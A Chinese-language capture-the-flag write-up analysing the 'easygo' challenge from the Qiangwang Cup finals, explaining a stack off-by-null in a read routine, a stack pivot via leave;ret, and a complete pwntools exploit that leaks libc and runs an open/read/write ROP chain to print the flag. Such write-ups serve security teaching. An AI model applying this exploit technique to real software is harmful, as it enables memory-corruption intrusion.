> 原文链接: https://www.anquanke.com//post/id/248720 


# 从强网杯线下easygo看栈中off-by-null的利用


                                阅读量   
                                **22747**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01722c3dd391baa12e.jpg)](https://p3.ssl.qhimg.com/t01722c3dd391baa12e.jpg)



之前我们一直都是将off-by-null设置到堆中，但是在今年强网杯线下的几道题目中都涉及到了栈中off-by-null的利用。

## 分析

程序的主逻辑非常的简单

```
__int64 main()
`{`
  __int64 result; // rax

  do
  `{`
    result = (unsigned int)get_input() ^ 1;
    if ( (_BYTE)result )
      break;
    printf("continue?(0:no, 1:yes): ");
    result = readint();
  `}`
  while ( (_DWORD)result );
  return result;
`}`

__int64 get_input()
`{`
  char s1[16]; // [rsp+0h] [rbp-10h] BYREF

  printf("client send &gt;&gt; ");
  readstr((__int64)s1, 0x10);
  if ( !strcmp(s1, "exit") )
    return 0LL;
  printf("server back &lt;&lt; %s\n", s1);
  return 1LL;
`}`

int readint()
`{`
  char nptr[16]; // [rsp+0h] [rbp-10h] BYREF

  readstr((__int64)nptr, 0x10);
  return atoi(nptr);
`}`

__int64 __fastcall readstr(__int64 buf, int length)
`{`
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i &lt; length; ++i )
  `{`
    if ( read(0, (void *)(i + buf), 1uLL) &lt;= 0 )
    `{`
      puts("read error");
      exit(0);
    `}`
    if ( *(_BYTE *)(i + buf) == 10 )
      break;
  `}`
  *(_BYTE *)(i + buf) = 0;
  return (unsigned int)i;
`}`
```

就是一直循环的读取数据，每一次循环都会判断是否continue，如果读取得到的字符串是exit那么程序就退出循环，结束。漏洞也非常的好发现，也就是在readstr函数中，最后赋值为0的部分存在问题，会导致一个off-by-null。

那么我们看看这个off-by-null会造成什么后果。可以注意到这里的readstr的调用都是针对栈中数据进行读入的，无论是getinput还是readint，都是向栈中0x10字节大小的空间进行输入的读入，并且传入的length都是0x10。那么就意味着我们可以覆写rbp的低一字节为0。

那么如果当当前栈中数据输入的地址的低1字节为0x00的时候，也就是rbp的低1字节为0x10的时候，如果我们将rbp的低1字节覆写为0，那么经过两次leave ret就可以劫持控制流到我们指定的位置。

但是这里我们只有0x10大小的地址空间，并且这里如果要调用两次leave ret的话，那么就需要从main函数返回。因此在`"continue?("` 的时候就需要输入0，也就是前0x8字节的地址空间需要部署固定的内容，因此这里只有0x8字节也就是一个gadget的空间来劫持控制流。

那么这里需要看一下如何扩大空间。看一下返回时候寄存器的情况。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0128b3570b0c9965cf.png)

我们看到这里的rdi的值是一个栈地址，并且恰好就是我们数据输入的栈地址（可以看一下rsp的值）。rsi的值则是一个libc附近的地址，那么很容易的想到这里直接调用readstr函数，就可以继续向栈中写入gadget，重新劫持控制流。我们看一下readstr函数的参数

```
__int64 __fastcall readstr(__int64 buf, int length)

```

注意到这里的第二个参数是一个length的值，也就是说需要libc的地址满足一定的条件，从而保证length是大于0的值，那么这里就可以读入一个很大的的内存空间用来部署我们的rop chain。

程序在一开始开启了沙箱

```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```

因此这里我们只能采用orw的方式获取flag。

当然这里在进行rop chain写入的时候还需要注意一个小细节，我们再来看一下readstr的实现

```
__int64 __fastcall readstr(__int64 buf, int length)
`{`
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i &lt; length; ++i )
  `{`
    if ( read(0, (void *)(i + buf), 1uLL) &lt;= 0 )
    `{`
      puts("read error");
      exit(0);
    `}`
    if ( *(_BYTE *)(i + buf) == 10 )
      break;
  `}`
  *(_BYTE *)(i + buf) = 0;
  return (unsigned int)i;
`}`
```

可以看到这里for循环中写入内容的指针值通过buf+i来进行控制的，部分是我们传入的参数，而i是存储在栈上的。而由于我们调用的特殊性，这里的readstr函数栈与我们将要覆写的栈重合，也就是在覆写的时候会将i覆写掉，因此这里在覆写的时候需要将i的值覆写为4才能够继续进行写入，当然覆写为其他的特定值跳过一定空间的写入也是可以的。

之后的rop chian 的构造不再赘述。



## EXP

完整的EXP如下

```
# -*- coding: utf-8 -*-
from pwn import *

file_path = "./easy_go"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 1
if debug:
    p = process([file_path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('172.20.5.31', 22423)
    libc = ELF('./libc-2.31.so')
    one_gadget = 0x0

p_rdi_r = 0x00000000004017a3
p_rsi_r15_r = 0x4017a1
read = 0x4015AB
p_rbp_r = 0x40125d
p_rsp_r = 0x40179d  # 3
ret = 0x000000000040101a

bss = 0x404050

while True:
    try:
        p.sendafter("send &gt;&gt; ", "a\n")

        p.sendafter("1:yes): ", (b"\x00" + str(0x100).encode()).ljust(8, b"\x00") + p64(0x4015AB))

        payload = p32(0xdeadbeef) + p32(0x4) + p64(0xdeadbeef) + p64(p_rdi_r) + p64(elf.got['puts']) + p64(elf.plt['puts'])
        payload += p64(p_rdi_r) + p64(bss) + p64(p_rsi_r15_r) + p64(0x300) + p64(0) + p64(read)
        payload += p64(p_rsp_r) + p64(bss)

        p.sendline(payload)

        libc.address = u64(p.recvline(timeout=1).strip().ljust(8, b"\x00")) - libc.sym['puts']
        log.success("libc address is `{``}`".format(hex(libc.address)))
        break
    except KeyboardInterrupt:
        exit(0)
    except:
        p.close()
        if debug:
            p = process([file_path])

        else:
            p = remote('172.20.5.31', 22423)

p_rdi_r = 0x0000000000026b72 + libc.address
p_rsi_r = 0x0000000000027529 + libc.address
p_rdx_r12_r = 0x000000000011c371 + libc.address
p_rax_r = 0x000000000004a550 + libc.address
syscall = 0x0000000000066229 + libc.address
ret_addr = 0x0000000000025679 + libc.address
flag_str_address = bss + 0x250

orw = flat([
    p_rax_r, 2,
    p_rdi_r, flag_str_address,
    p_rsi_r, 0,
    syscall,
    p_rax_r, 0,
    p_rdi_r, 3,
    p_rsi_r, flag_str_address,
    p_rdx_r12_r, 0x40, 0,
    syscall,
    p_rax_r, 1,
    p_rdi_r, 1,
    p_rsi_r, flag_str_address,
    p_rdx_r12_r, 0x40, 0,
    syscall
])

payload = p64(ret)*4 + orw.ljust(0x250, b"\x00") + b"flag\n"
p.send(payload)

p.interactive()
```
